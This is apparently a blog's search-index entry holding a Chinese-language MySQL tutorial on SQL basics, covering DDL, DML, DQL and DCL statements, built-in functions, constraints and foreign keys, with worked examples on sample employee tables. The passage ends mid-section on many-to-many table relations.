[{"title":"SQL语句","url":"/2023/08/07/3/","content":"1. SQL基础1.1 数据库相关概念数据库、数据库管理系统、SQL的概念。\n  目前主流的关系型数据库管理系统的市场占有率排名如下：\nOracle：大型的收费数据库，Oracle公司产品，价格昂贵。MySQL：开源免费的中小型数据库。 目前Oracle推出了收费版本的MySQL，也提供了免费的社区版本。SQL Server：Microsoft 公司推出的收费的中型数据库，C#、.net等语言常用。PostgreSQL：开源免费的中小型数据库。DB2：IBM公司的大型收费数据库产品。SQLLite：嵌入式的微型数据库。Android内置的数据库采用的就是该数据库。MariaDB：开源免费的中小型数据库。是MySQL数据库的另外一个分支、另外一个衍生产品，与 MySQL数据库有很好的兼容性。\n关系型数据库与非关系型数据库一、概念关系型数据库（RDBMS）是建立在关系模型基础上，由多张相互连接的二维表组成的数据库。而所谓二维表，指的是由行和列组成的表，如下图（就类似于Excel表格数据，有表头、有列、有行， 还可以通过一列关联另外一个表格中的某一列数据）。我们之前提到的MySQL、Oracle、DB2、 SQLServer这些都是属于关系型数据库，里面都是基于二维表存储数据的。简单说，基于二维表存储 数据的数据库就成为关系型数据库，不是基于二维表存储数据的数据库，就是非关系型数据库。关系有一对一，一对多，多对多等。\n非关系型数据库（NoSQL）主要指那些非关系型的、分布式的，且一般不保证ACID的数据存储系统。主要代表MongoDB，Redis、CouchDB。\nNoSQL提出了另一种理念，以键值来存储，且结构不稳定，每一个元组都可以有不一样的字段，这种就不会局限于固定的结构，可以减少一些时间和空间的开销。使用这种方式，为了获取用户的不同信息，不需要像关系型数据库中，需要进行多表查询。仅仅需要根据key来取出对应的value值即可。\n二、优缺点比较关系型是结构化查询语言，NoSql是采用更简单而且精确的数据访问方式；SQl数据库大多比较昂贵，而NoSql大多是开源的。关系数据库安全系数高，容易理解，但比较浪费磁盘空间；非关系型数据库安全系数低但效率高。\n目前许多大型互联网都会选用MySql+NoSql的组合方案，因为SQL和NoSql都有各自的优缺点。\n关系型数据库适合存储结构化数据，比如：用户的账号、地址：\nNoSql适合存储非结构化数据，比如：文章、评论：这些数据通常用于模糊处理，例如全文搜索、机器学习，适合存储较为简单的数据。这些数据是海量的，并且增长的速度是难以预期的。\n总结：\nSQL数据库依然强大，可以可靠的处理事务并且保持事务的完整性，只有你的数据非常大，操作扩展需要更加分布式的系统时，才考虑NoSql数据库。\n1.2 客户端连接使用系统自带的命令行工具执行指令mysql [-h 127.0.0.1] [-P 3306] -u root -p注意： 使用这种方式进行连接时，需要安装完毕后配置PATH环境变量。\n参数：-h : MySQL服务所在的主机IP -P : MySQL服务端口号， 默认3306 -u : MySQL数据库用户名 -p ： MySQL数据库用户名对应的密码 []内为可选参数，如果需要连接远程的MySQL，需要加上这两个参数来指定远程主机IP、端口，如果连接本地的MySQL，则无需指定这两个参数。\n\n\n1.3 数据模型MySQL是关系型数据库，是基于二维表进行数据存储的，具体的结构图如下。\n\n我们可以通过MySQL客户端连接数据库管理系统DBMS，然后通过DBMS操作数据库。可以使用SQL语句，通过数据库管理系统操作数据库，以及操作数据库中的表结构及数据。一个数据库服务器中可以创建多个数据库，一个数据库中也可以包含多张表，而一张表中又可以包含多行记录。\n2. SQL全称 Structured Query Language，结构化查询语言。操作关系型数据库的编程语言，定义了一套操作关系型数据库统一标准 。\n2.1 SQL通用语法SQL语言的通用语法。1). SQL语句可以单行或多行书写，以分号结尾。2). SQL语句可以使用空格&#x2F;缩进来增强语句的可读性。3). MySQL数据库的SQL语句不区分大小写，关键字建议使用大写。4). 注释：单行注释：– 注释内容或 # 注释内容多行注释：&#x2F;* 注释内容 *&#x2F;\n2.2 SQL分类SQL语句的五种分类分别是DQL、DML、DDL、TCL和TCL。\n1、数据库查询语言（DQL）数据查询语言DQL基本结构是由SELECT子句，FROM子句，WHERE 子句组成的查询块，简称DQL，Data Query Language。代表关键字为select。\n2、数据库操作语言（DML）用户通过它可以实现对数据库的基本操作。简称DML，Data Manipulation Language。代表关键字为insert、delete 、update。\n3、数据库定义语言（DDL）数据定义语言DDL用来创建数据库中的各种对象，创建、删除、修改表的结构，比如表、视图、索引、同义词、聚簇等，简称DDL，Data Denifition Language。代表关键字为create、drop、alter。和DML相比，DML是修改数据库表中的数据，而 DDL 是修改数据中表的结构。\n4、事务控制语言（TCL）TCL经常被用于快速原型开发、脚本编程、GUI和测试等方面，简称：TCL，Trasactional Control Languag。代表关键字为commit、rollback。\n5、数据控制语言（DCL）数据控制语言DCL用来授予或回收访问数据库的某种特权，并控制数据库操纵事务发生的时间及效果，对数据库实行监视等。简称：DCL，Data Control Language。代表关键字为grant、revoke。\n2.3 DDLData Definition Language，数据定义语言，用来定义数据库对象(数据库，表，字段) 。 \n1). 查询所有数据库\n\nshow databases ; \n\n\n2). 查询当前数据库\n\nselect database() ; \n\n3). 创建数据库create database [ if not exists ] 数据库名 [ default charset 字符集 ] [ collate 排序规则 ] ;  \n在同一个数据库服务器中，不能创建两个名称相同的数据库，否则将会报错。\n\n可以通过if not exists 参数来解决这个问题，数据库不存在, 则创建该数据库，如果存在，则不创建。create database if not extists itcast; \n\n创建一个itheima数据库，并且指定字符集create database itheima default charset utf8mb4; \n\n4). 删除数据库\n\ndrop database [ if exists ] 数据库名 ; \n\n如果删除一个不存在的数据库，将会报错。此时，可以加上参数 if exists ，如果数据库存在，再执行删除，否则不执行删除。\n\n5). 切换数据库\nuse 数据库名 ; 我们要操作某一个数据库下的表时，就需要通过该指令，切换到对应的数据库下，否则是不能操作的。比如，切换到itcast数据，执行如下SQL：\n\nuse itcast; \n\n2.4 表操作2.4.1表操作-查询创建1). 查询当前数据库所有表show tables;比如,我们可以切换到sys这个系统数据库,并查看系统数据库中的所有表结构。use sys;show tables;\n\n2). 查看指定表结构desc 表名 ;通过这条指令，我们可以查看到指定表的字段，字段的类型、是否可以为NULL，是否存在默认值等信息。\n\n3). 查询指定表的建表语句show create table 表名 ;通过这条指令，主要是用来查看建表语句的，而有部分参数我们在创建表的时候，并未指定也会查询到，因为这部分是数据库的默认值，如：存储引擎、字符集等。\n\n4). 创建表结构CREATE TABLE 表名(字段1 字段1类型 [ COMMENT 字段1注释 ],字段2 字段2类型 [COMMENT 字段2注释 ],字段3 字段3类型 [COMMENT 字段3注释 ],……字段n 字段n类型 [COMMENT 字段n注释 ]) [ COMMENT 表注释 ] ;注意: […] 内为可选参数，最后一个字段后面没有逗号比如，我们创建一张表 tb_user ，对应的结构如下，那么建表语句为：\n\ncreate table tb_user( id int comment &#x27;编号&#x27;, name varchar(50) comment &#x27;姓名&#x27;, age int comment &#x27;年龄&#x27;, gender varchar(1) comment &#x27;性别&#x27; ) comment &#x27;用户表&#x27;; \n\n2.4.2表操作-数据类型在上述的建表语句中，我们在指定字段的数据类型时，用到了int ，varchar，MySQL中除以上的数据类型，还有其他的数据类型。主要分为三类：数值类型、字符串类型、日期时间类型。1）数值类型\n\n2）字符串类型\n\n3）日期时间类型\n\n2.4.3 表操作-修改1). 添加字段ALTER TABLE 表名 ADD 字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ];案例为emp表增加一个新的字段”昵称”为nickname，类型为varchar(20)ALTER TABLE emp ADD nickname varchar(20) COMMENT ‘昵称’; \n2). 修改数据类型ALTER TABLE 表名 MODIFY 字段名 新数据类型 (长度); \n3). 修改字段名和字段类型ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型 (长度) [ COMMENT 注释 ] [ 约束 ];案例:将emp表的nickname字段修改为username，类型为varchar(30)ALTER TABLE emp CHANGE nickname username varchar(30) COMMENT ‘昵称’; \n4). 删除字段ALTER TABLE 表名 DROP 字段名;案例:将emp表的字段username删除ALTER TABLE emp DROP username; \n5). 修改表名ALTER TABLE 表名 RENAME TO 新表名;案例:将emp表的表名修改为 employeeALTER TABLE emp RENAME TO employee; \n2.4.6 表操作-删除1). 删除表DROP TABLE [ IF EXISTS ] 表名;可选项 IF EXISTS 代表，只有表名存在时才会删除该表，表名不存在，则不执行删除操作(如果不加该参数项，删除一张不存在的表，执行将会报错)。案例:如果tb_user表存在，则删除tb_user表DROP TABLE IF EXISTS tb_user;2). 删除指定表, 并重新创建表TRUNCATE TABLE 表名;注意: 在删除表的时候，表中的全部数据也都会被删除。\n2.5 图形化界面工具上述，我们已经讲解了通过DDL语句，如何操作数据库、操作表、操作表中的字段，而通过DDL语句执行在命令进行操作，主要存在以下两点问题：1).会影响开发效率 ;2). 使用起来，并不直观，并不方便 ；所以呢，我们在日常的开发中，会借助于MySQL的图形化界面，来简化开发，提高开发效率。navicat是其中一种，使用navicat能让我们更方便地进行数据库操作。\n2.6 DMLDML英文全称是Data Manipulation Language(数据操作语言)，用来对数据库中表的数据记录进行增、删、改操作。添加数据（INSERT）修改数据（UPDATE）删除数据（DELETE） \n2.6.1 添加数据1). 给指定字段添加数据INSERT INTO 表名 (字段名1, 字段名2, …) VALUES (值1, 值2, …);1案例: 给employee表所有的字段添加数据 ；插入数据完成之后，我们有两种方式，查询数据库的数据：A. 方式一在左侧的表名上双击，就可以查看这张表的数据\n\nB. 方式二可以直接一条查询数据的SQL语句, 语句如下:select * from employee;案例: 给employee表所有的字段添加数据执行如下SQL，添加的年龄字段值为3。insert into employee(id,workno,name,gender,age,idcard,entrydate)values(1,’1’,’Itcast’,’男’,3,’123456789012345678’,’2000-01-01’); \n2). 给全部字段添加数据INSERT INTO 表名 VALUES (值1, 值2, …);案例：插入数据到employee表，具体的SQL如下：insert into employee values(2,’2’,’张无忌’,’男’,18,’123456789012345670’,’2005-01- 01’);3). 批量添加数据INSERT INTO 表名 (字段名1, 字段名2, …) VALUES (值1, 值2, …), (值1, 值2, …), (值 1, 值2, …);INSERT INTO 表名 VALUES (值1, 值2, …), (值1, 值2, …), (值1, 值2, …) ;案例：批量插入数据到employee表，具体的SQL如下：insert into employee values(3,’3’,’韦一笑’,’男’,38,’123456789012345670’,’2005-01- 01’),(4,’4’,’赵敏’,’女’,18,’123456789012345670’,’2005-01-01’); \n**注意事项: **\n\n\n插入数据时，指定的字段顺序需要与值的顺序是一一对应的。\n字符串和日期型数据应该包含在引号中。 \n插入的数据大小，应该在字段的规定范围内。\n\n\n2.6.2 修改数据修改数据的具体语法为:UPDATE 表名 SET 字段名1 &#x3D; 值1 , 字段名2 &#x3D; 值2 , …. [ WHERE 条件 ] ;案例:A. 修改id为1的数据，将name修改为itheimaupdate employee set name &#x3D; ‘itheima’ where id &#x3D; 1;B. 修改id为1的数据, 将name修改为小昭, gender修改为 女update employee set name &#x3D; ‘小昭’ , gender &#x3D; ‘女’ where id &#x3D; 1;C. 将所有的员工入职日期修改为 2008-01-01update employee set entrydate &#x3D; ‘2008-01-01’;注意事项:修改语句的条件可以有，也可以没有，如果没有条件，则会修改整张表的所有数据。\n2.6.3 删除数据删除数据的具体语法为：DELETE FROM 表名 [ WHERE 条件 ] ;案例:A. 删除gender为女的员工delete from employee where gender &#x3D; ‘女’;B. 删除所有员工delete from employee;\n**注意事项: **\n\n\nDELETE 语句的条件可以有，也可以没有，如果没有条件，则会删除整张表的所有数据。 \nDELETE 语句不能删除某一个字段的值(可以使用UPDATE，将该字段值置为NULL即可)。 \n当进行删除全部数据操作时，datagrip会提示我们，询问是否确认删除，我们直接点击Execute即可。\n\n\n2.7 DQLDQL英文全称是Data Query Language(数据查询语言)，数据查询语言，用来查询数据库中表的记录。查询关键字: SELECT在一个正常的业务系统中，查询操作的频次是要远高于增删改的，当我们去访问企业官网、电商网站，在这些网站中我们所看到的数据，实际都是需要从数据库中查询并展示的。而且在查询的过程中，可能还会涉及到条件、排序、分页等操作。\n2.7.1 基础查询在基本查询的DQL语句中，不带任何的查询条件，查询的语法如下：1). 查询多个字段SELECT 字段1, 字段2, 字段3 … FROM 表名 ;SELECT * FROM 表名 ;注意 : * 号代表查询所有字段，在实际开发中尽量少用（不直观、影响效率）。2). 字段设置别名SELECT 字段1 [ AS 别名1 ] , 字段2 [ AS 别名2 ] … FROM 表名;SELECT 字段1 [ 别名1 ] , 字段2 [ 别名2 ] … FROM 表名;3). 去除重复记录SELECT DISTINCT 字段列表 FROM 表名;案例：A. 查询指定字段 name, workno, age并返回select name,workno,age from emp;B. 查询返回所有字段select id ,workno,name,gender,age,idcard,workaddress,entrydate from emp;select * from emp;C. 查询所有员工的工作地址,起别名select workaddress as ‘工作地址’ from emp;– as可以省略select workaddress ‘工作地址’ from emp;D. 查询公司员工的上班地址有哪些(不要重复)select distinct workaddress ‘工作地址’ from emp; \n2.7.2 条件查询1). 语法SELECT 字段列表 FROM 表名 WHERE 条件列表 ;2). 条件比较运算符、逻辑运算符。\n案例:A. 查询年龄等于 88 的员工select * from emp where age &#x3D; 88;B. 查询年龄小于 20 的员工信息select * from emp where age &lt; 20;C. 查询年龄小于等于 20 的员工信息select * from emp where age &lt;&#x3D; 20;D. 查询没有身份证号的员工信息select * from emp where idcard is null;F. 查询年龄不等于 88 的员工信息select * from emp where age !&#x3D; 88;select * from emp where age &lt;&gt; 88;G. 查询年龄在15岁(包含) 到 20岁(包含)之间的员工信息select * from emp where age &gt;&#x3D; 15 &amp;&amp; age &lt;&#x3D; 20;select * from emp where age &gt;&#x3D; 15 and age &lt;&#x3D; 20;select * from emp where age between 15 and 20;H. 查询性别为 女 且年龄小于 25岁的员工信息select * from emp where gender &#x3D; ‘女’ and age &lt; 25;I. 查询年龄等于18 或 20 或 40 的员工信息select * from emp where age &#x3D; 18 or age &#x3D; 20 or age &#x3D;40;select * from emp where age in(18,20,40);J. 查询姓名为两个字的员工信息 _ %select * from emp where name like ‘__’;K. 查询身份证号最后一位是X的员工信息select * from emp where idcard like ‘%X’; \n2.7.3 聚合函数1). 介绍将一列数据作为一个整体，进行纵向计算 。2). 常见的聚合函数\n3). 语法SELECT 聚合函数(字段列表) FROM 表名 ;注意 : NULL值是不参与所有聚合函数运算的。案例：A. 统计该企业员工数量select count(*) from emp; – 统计的是总记录数select count(idcard) from emp; – 统计的是idcard字段不为null的记录数对于count聚合函数，统计符合条件的总记录数，还可以通过 count(数字&#x2F;字符串)的形式进行统计查询，比如：select count(1) from emp; \nB. 统计该企业员工的平均年龄select avg(age) from emp; \nC. 统计该企业员工的最大年龄select max(age) from emp;\nD. 统计该企业员工的最小年龄select min(age) from emp; \nE. 统计西安地区员工的年龄之和select sum(age) from emp where workaddress &#x3D; ‘西安’; \n2.7.4 分组查询1). 语法SELECT 字段列表 FROM 表名 [ WHERE 条件 ] GROUP BY 分组字段名 [ HAVING 分组 后过滤条件 ];2). where与having区别执行时机不同：where是分组之前进行过滤，不满足where条件，不参与分组；而having是分组之后对结果进行过滤。 \n**注意事项: **\n\n\n分组之后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义。 \n执行顺序: where &gt; 聚合函数 &gt; having 。 \n支持多字段分组, 具体语法为 : group by columnA,columnB\n\n\n案例:A. 根据性别分组 , 统计男性员工 和 女性员工的数量select gender, count() from emp group by gender ;B. 根据性别分组 , 统计男性员工 和 女性员工的平均年龄select gender, avg(age) from emp group by gender ;C. 查询年龄小于45的员工 , 并根据工作地址分组 , 获取员工数量大于等于3的工作地址select workaddress, count() address_count from emp where age &lt; 45 group by workaddress having address_count &gt;&#x3D; 3;D. 统计各个工作地址上班的男性及女性员工的数量select workaddress, gender, count(*) ‘数量’ from emp group by gender , workaddress; \n2.7.5 排序查询排序在日常开发中是非常常见的一个操作，有升序排序，也有降序排序。\n1). 语法SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1 , 字段2 排序方式2 ;2). 排序方式ASC : 升序(默认值)DESC: 降序注意事项：• 如果是升序, 可以不指定排序方式ASC ;• 如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序 ;案例:A. 根据年龄对公司的员工进行升序排序select * from emp order by age asc;select * from emp order by age;B. 根据入职时间, 对员工进行降序排序select * from emp order by entrydate desc;C. 根据年龄对公司的员工进行升序排序 , 年龄相同 , 再按照入职时间进行降序排序select * from emp order by age asc , entrydate desc;\n2.7.6 分页查询分页操作在业务系统开发时，也是非常常见的一个功能，我们在网站中看到的各种各样的分页条，后台都需要借助于数据库的分页操作。\n1). 语法SELECT 字段列表 FROM 表名 LIMIT 起始索引, 查询记录数 ;注意事项:• 起始索引从0开始，起始索引 &#x3D; （查询页码 - 1）* 每页显示记录数。• 分页查询是数据库的方言，不同的数据库有不同的实现，MySQL中是LIMIT。• 如果查询的是第一页数据，起始索引可以省略，直接简写为 limit 10案例:A. 查询第1页员工数据, 每页展示10条记录select * from emp limit 0,10;select * from emp limit 10;B. 查询第2页员工数据, 每页展示10条记录 ——–&gt; (页码-1)*页展示记录数select * from emp limit 10,10; \n2.7.7 案例1). 查询年龄为20,21,22,23岁的员工信息。select * from emp where gender &#x3D; ‘女’ and age in(20,21,22,23);2). 查询性别为 男 ，并且年龄在 20-40 岁(含)以内的姓名为三个字的员工。select * from emp where gender &#x3D; ‘男’ and ( age between 20 and 40 ) and name like’___’; \n3). 统计员工表中, 年龄小于60岁的 , 男性员工和女性员工的人数select gender, count(*) from emp where age &lt; 60 group by gender; \n4). 查询所有年龄小于等于35岁员工的姓名和年龄，并对查询结果按年龄升序排序，如果年龄相同按入职时间降序排序。select name , age from emp where age &lt;&#x3D; 35 order by age asc , entrydate desc;\n5). 查询性别为男，且年龄在20-40 岁(含)以内的前5个员工信息，对查询的结果按年龄升序排序,年龄相同按入职时间升序排序。select * from emp where gender &#x3D; ‘男’ and age between 20 and 40 order by age asc ,entrydate asc limit 5 ; \n2.7.8 执行顺序DQL语句在执行时的执行顺序，也就是先执行哪一部分，后执行哪一部分。\n\n2.8 DCLDCL英文全称是Data Control Language(数据控制语言)，用来管理数据库用户、控制数据库的访问权限。\n2.8.1 管理用户1). 查询用户select * from mysql.user;查询的结果如下:\n\n其中 Host代表当前用户访问的主机, 如果为localhost, 仅代表只能够在当前本机访问，是不可以远程访问的。 User代表的是访问该数据库的用户名。在MySQL中需要通过Host和User来唯一标识一个用户。2). 创建用户CREATE USER ‘用户名‘@’主机名’ IDENTIFIED BY ‘密码’;3). 修改用户密码ALTER USER ‘用户名‘@’主机名’ IDENTIFIED WITH mysql_native_password BY ‘新密码’ ;4). 删除用户DROP USER ‘用户名‘@’主机名’ ;注意事项: \n\n\n在MySQL中需要通过用户名@主机名的方式，来唯一标识一个用户。\n主机名可以使用 % 通配。 \n这类SQL开发人员操作的比较少，主要是DBA（ Database Administrator 数据库 管理员）使用。\n\n\n案例：A. 创建用户itcast, 只能够在当前主机localhost访问, 密码123456create user ‘itcast‘@’localhost’ identified by ‘123456’;B. 创建用户heima, 可以在任意主机访问该数据库, 密码123456;create user ‘heima‘@’%’ identified by ‘123456’;C. 修改用户heima的访问密码为1234;alter user ‘heima‘@’%’ identified with mysql_native_password by ‘1234’;D. 删除 itcast@localhost 用户drop user ‘itcast‘@’localhost’; \n2.8.2 权限控制MySQL中定义了很多种权限，但是常用的就以下几种：\n\n上述只是简单罗列了常见的几种权限描述，其他权限描述及含义，可以直接参考官方文档。1). 查询权限SHOW GRANTS FOR ‘用户名‘@’主机名’ ;2). 授予权限GRANT 权限列表 ON 数据库名.表名 TO ‘用户名‘@’主机名’;3). 撤销权限REVOKE 权限列表 ON 数据库名.表名 FROM ‘用户名‘@’主机名’;\n注意事项： \n\n\n多个权限之间，使用逗号分隔 \n授权时， 数据库名和表名可以使用 * 进行通配，代表所有。\n\n\n案例:A. 查询 ‘heima‘@’%’ 用户的权限show grants for ‘heima‘@’%’;B. 授予 ‘heima‘@’%’ 用户itcast数据库所有表的所有操作权限grant all on itcast.* to ‘heima‘@’%’;C. 撤销 ‘heima‘@’%’ 用户的itcast数据库的所有权限revoke all on itcast.* from ‘heima‘@’%’; \n2.8.3.函数函数 是指一段可以直接被另一段程序调用的程序或代码。MySQL中的函数主要分为以下四类： 字符串函数、数值函数、日期函数、流程函数。1） 字符串函数MySQL中内置了很多字符串函数，常用的几个如下：\n\n演示如下：A. concat : 字符串拼接select concat(‘Hello’ , ‘ MySQL’);B. lower : 全部转小写select lower(‘Hello’);C. upper : 全部转大写select upper(‘Hello’);D. lpad : 左填充select lpad(‘01’, 5, ‘-‘);E. rpad : 右填充select rpad(‘01’, 5, ‘-‘);F. trim : 去除空格select trim(‘ Hello MySQL ‘);G. substring : 截取子字符串select substring(‘Hello MySQL’,1,5);案例:\n\n由于业务需求变更，企业员工的工号，统一为5位数，目前不足5位数的全部在前面补0。比如： 1号员工的工号应该为00001update emp set workno &#x3D; lpad(workno, 5, ‘0’);处理完毕后, 具体的数据为: \n\n2） 数值函数常见的数值函数如下：\n\n演示如下：A. ceil：向上取整select ceil(1.1);B. floor：向下取整select floor(1.9);C. mod：取模select mod(7,4);D. rand：获取随机数select rand();E. round：四舍五入select round(2.344,2);案例：通过数据库的函数，生成一个六位数的随机验证码。思路： 获取随机数可以通过rand()函数，但是获取出来的随机数是在0-1之间的，所以可以在其基础上乘以1000000，然后舍弃小数部分，如果长度不足6位，补0select lpad(round(rand()*1000000 , 0), 6, ‘0’);\n3） 日期函数常见的日期函数如下：\n\n演示如下：A. curdate：当前日期select curdate();B. curtime：当前时间select curtime();C. now：当前日期和时间select now();D. YEAR , MONTH , DAY：当前年、月、日select YEAR(now());select MONTH(now());select DAY(now());E. date_add：增加指定的时间间隔select date_add(now(), INTERVAL 70 YEAR );F. datediff：获取两个日期相差的天数select datediff(‘2021-10-01’, ‘2021-12-01’); \n案例：查询所有员工的入职天数，并根据入职天数倒序排序。思路： 入职天数，就是通过当前日期 - 入职日期，所以需要使用datediff函数来完成。select name, datediff(curdate(), entrydate) as ‘entrydays’ from emp order by entrydays desc; \n3.1 流程函数流程函数也是很常用的一类函数，可以在SQL语句中实现条件筛选，从而提高语句的效率。\n\n演示如下：A. ifselect if(false, ‘Ok’, ‘Error’);B. ifnullselect ifnull(‘Ok’,’Default’);select ifnull(‘’,’Default’);select ifnull(null,’Default’);C. case when then else end需求: 查询emp表的员工姓名和工作地址 (北京&#x2F;上海 —-&gt; 一线城市 , 其他 —-&gt; 二线城市)select name , ( case workaddress when ‘北京’ then ‘一线城市’ when ‘上海’ then ‘一线城市’ else ‘二线城市’ end ) as ‘工作地址’ from emp;案例:create table score(id int comment ‘ID’,name varchar(20) comment ‘姓名’,math int comment ‘数学’,english int comment ‘英语’,chinese int comment ‘语文’) comment ‘学员成绩表’;insert into score(id, name, math, english, chinese) VALUES (1, ‘Tom’, 67, 88, 95 ), (2, ‘Rose’ , 23, 66, 90),(3, ‘Jack’, 56, 98, 76);具体的SQL语句如下:select id , name,(case when math &gt;&#x3D; 85 then ‘优秀’ when math &gt;&#x3D;60 then ‘及格’ else ‘不及格’ end )‘数学’,(case when english &gt;&#x3D; 85 then ‘优秀’ when english &gt;&#x3D;60 then ‘及格’ else ‘不及格’end ) ‘英语’,(case when chinese &gt;&#x3D; 85 then ‘优秀’ when chinese &gt;&#x3D;60 then ‘及格’ else ‘不及格’end ) ‘语文’from score;MySQL的常见函数我们学习完了，那接下来，我们就来分析一下，在前面讲到的两个函数的案例场景，思考一下需要用到什么样的函数来实现?1). 数据库中，存储的是入职日期，如 2000-01-01，如何快速计算出入职天数呢？ ——–&gt;答案: datediff2). 数据库中，存储的是学生的分数值，如98、75，如何快速判定分数的等级呢？ ———-&gt;答案: case … when …\n3.2约束3.2.1 概述概念：约束是作用于表中字段上的规则，用于限制存储在表中的数据。目的：保证数据库中数据的正确、有效性和完整性。分类\n注意：约束是作用于表中字段上的，可以在创建表&#x2F;修改表的时候添加约束。\n3.2.2 约束演示上面我们介绍了数据库中常见的约束，以及约束涉及到的关键字，那这些约束我们到底如何在创建表、修改表的时候来指定呢，接下来我们就通过一个案例，来演示一下。案例需求： 根据需求，完成表结构的创建。需求如下：\n对应的建表语句为：CREATE TABLE tb_user(id int AUTO_INCREMENT PRIMARY KEY COMMENT ‘ID唯一标识’,name varchar(10) NOT NULL UNIQUE COMMENT ‘姓名’ ,age int check (age &gt; 0 &amp;&amp; age &lt;&#x3D; 120) COMMENT ‘年龄’ ,status char(1) default ‘1’ COMMENT ‘状态’,gender char(1) COMMENT ‘性别’);在为字段添加约束时，我们只需要在字段之后加上约束的关键字即可，需要关注其语法。我们执行上面的SQL把表结构创建完成，然后接下来，就可以通过一组数据进行测试，从而验证一下，约束是否可以生效。insert into tb_user(name,age,status,gender) values (‘Tom1’,19,’1’,’男’),(‘Tom2’,25,’0’,’男’);insert into tb_user(name,age,status,gender) values (‘Tom3’,19,’1’,’男’);insert into tb_user(name,age,status,gender) values (null,19,’1’,’男’);insert into tb_user(name,age,status,gender) values (‘Tom3’,19,’1’,’男’);insert into tb_user(name,age,status,gender) values (‘Tom4’,80,’1’,’男’);insert into tb_user(name,age,status,gender) values (‘Tom5’,-1,’1’,’男’);insert into tb_user(name,age,status,gender) values (‘Tom5’,121,’1’,’男’);insert into tb_user(name,age,gender) values (‘Tom5’,120,’男’);上面，我们是通过编写SQL语句的形式来完成约束的指定，那加入我们是通过图形化界面来创建表结构时，又该如何来指定约束呢？ 只需要在创建表的时候，根据我们的需要选择对应的约束即可。\n3.2.3 外键约束1） 介绍外键：用来让两张表的数据之间建立连接，从而保证数据的一致性和完整性。我们来看一个例子：\n左侧的emp表是员工表，里面存储员工的基本信息，包含员工的ID、姓名、年龄、职位、薪资、入职日期、上级主管ID、部门ID，在员工的信息中存储的是部门的ID dept_id，而这个部门的ID是关联的部门表dept的主键id，那emp表的dept_id就是外键,关联的是另一张表的主键。注意：目前上述两张表，只是在逻辑上存在这样一层关系；在数据库层面，并未建立外键关联，所以是无法保证数据的一致性和完整性的没有数据库外键关联的情况下，能够保证一致性和完整性呢，我们来测试一下。准备数据create table dept(id int auto_increment comment ‘ID’ primary key,name varchar(50) not null comment ‘部门名称’ )comment ‘部门表’;INSERT INTO dept (id, name) VALUES (1, ‘研发部’), (2, ‘市场部’),(3, ‘财务部’), (4, ‘销售部’), (5, ‘总经办’);create table emp(id int auto_increment comment ‘ID’ primary key,name varchar(50) not null comment ‘姓名’,age int comment ‘年龄’,job varchar(20) comment ‘职位’,salary int comment ‘薪资’,entrydate date comment ‘入职时间’,managerid int comment ‘直属领导ID’,dept_id int comment ‘部门ID’)comment ‘员工表’;INSERT INTO emp (id, name, age, job,salary, entrydate, managerid, dept_id) VALUES(1, ‘金庸’, 66, ‘总裁’,20000, ‘2000-01-01’, null,5),(2, ‘张无忌’, 20, ‘项目经理’,12500, ‘2005-12-05’, 1,1),(3, ‘杨逍’, 33, ‘开发’, 8400,’2000-11-03’, 2,1),(4, ‘韦一笑’, 48, ‘开发’,11000, ‘2002-02-05’, 2,1),(5, ‘常遇春’, 43, ‘开发’,10500, ‘2004-09-07’, 3,1),(6, ‘小昭’, 19, ‘程序员鼓励师’,6600, ‘2004-10-12’, 2,1); \n接下来，我们可以做一个测试，删除id为1的部门信息。\n结果，我们看到删除成功，而删除成功之后，部门表不存在id为1的部门，而在emp表中还有很多的员工，关联的为id为1的部门，此时就出现了数据的不完整性。 而要想解决这个问题就得通过数据库的外键约束。\n3.2.4 语法1). 添加外键CREATE TABLE 表名(字段名 数据类型,…[CONSTRAINT] [外键名称] FOREIGN KEY (外键字段名) REFERENCES 主表 (主表列名));ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段名) REFERENCES 主表 (主表列名) ;案例:为emp表的dept_id字段添加外键约束,关联dept表的主键id。alter table emp add constraint fk_emp_dept_id foreign key (dept_id) referencesdept(id); \n添加了外键约束之后，我们再到dept表(父表)删除id为1的记录，然后看一下会发生什么现象。 此时将会报错，不能删除或更新父表记录，因为存在外键约束。\n2). 删除外键ALTER TABLE 表名 DROP FOREIGN KEY 外键名称;案例：删除emp表的外键fk_emp_dept_id。alter table emp drop foreign key fk_emp_dept_id; \n3.2.3 删除&#x2F;更新行为添加了外键之后，再删除父表数据时产生的约束行为，我们就称为删除&#x2F;更新行为。具体的删除&#x2F;更新行为有以下几种:\n具体语法为:ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段) REFERENCES主表名 (主表字段名) ON UPDATE CASCADE ON DELETE CASCADE;演示如下：由于NO ACTION 是默认行为，我们前面语法演示的时候，已经测试过了，就不再演示了，这里我们再演示其他的两种行为：CASCADE、SET NULL。1). CASCADEalter table emp add constraint fk_emp_dept_id foreign key (dept_id) references dept(id) on update cascade on delete cascade ;A. 修改父表id为1的记录，将id修改为6\n我们发现，原来在子表中dept_id值为1的记录，现在也变为6了，这就是cascade级联的效果。在一般的业务系统中，不会修改一张表的主键值B. 删除父表id为6的记录\n我们发现，父表的数据删除成功了，但是子表中关联的记录也被级联删除了。2). SET NULL在进行测试之前，我们先需要删除上面建立的外键 fk_emp_dept_id。然后再通过数据脚本，将emp、dept表的数据恢复了。alter table emp add constraint fk_emp_dept_id foreign key (dept_id) referencesdept(id) on update set null on delete set null ;接下来，我们删除id为1的数据，看看会发生什么样的现象。\n我们发现父表的记录是可以正常的删除的，父表的数据删除之后，再打开子表 emp，我们发现子表emp的dept_id字段，原来dept_id为1的数据，现在都被置为NULL了。\n这就是SET NULL这种删除&#x2F;更新行为的效果。\n4 多表查询我们之前在讲解SQL语句的时候，讲解了DQL语句，也就是数据查询语句，但是之前讲解的查询都是单表查询，而本章节我们要学习的则是多表查询操作，主要从以下几个方面进行讲解。\n4.1 多表关系项目开发中，在进行数据库表结构设计时，会根据业务需求及业务模块之间的关系，分析并设计表结构，由于业务之间相互关联，所以各个表结构之间也存在着各种联系，基本上分为三种：一对多(多对一)多对多一对一 \n4.1.1 一对多案例: 部门 与 员工的关系关系: 一个部门对应多个员工，一个员工对应一个部门实现: 在多的一方建立外键，指向一的一方的主键\n4.1.2 多对多案例: 学生 与 课程的关系关系: 